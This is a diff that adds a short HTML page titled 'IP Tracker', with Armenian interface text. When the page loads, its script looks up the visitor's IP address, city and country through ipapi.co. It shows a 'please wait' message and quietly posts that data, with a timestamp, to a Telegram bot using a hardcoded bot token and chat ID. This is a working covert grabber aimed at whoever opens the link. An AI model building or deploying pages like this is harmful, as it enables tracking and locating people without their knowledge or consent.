@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="hy">
+<head>
+  <meta charset="UTF-8">
+  <title>IP Tracker</title>
+</head>
+<body>
+  <h2>Սպասեք...</h2>
+  <pre id="info"></pre>
+  <script>
+    fetch("https://ipapi.co/json")
+      .then(r => r.json())
+      .then(data => {
+        const now = new Date().toLocaleString();
+        const text = `
+IP: ${data.ip}
+Քաղաք: ${data.city}
+Երկիր: ${data.country_name}
+Ժամ: ${now}
+`;
+        document.getElementById('info').innerText = text;
+
+        fetch("https://api.telegram.org/bot8134204698:AAH1e2bdQY9m2xPBDg-pq6yx6swD78IITms/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: 8134204698,
+            text: text
+          })
+        });
+      })
+      .catch(e => {
+        document.getElementById('info').innerText = "Սխալ է տեղի ունեցել։";
+        console.error(e);
+      });
+  </script>
+</body>
+</html>
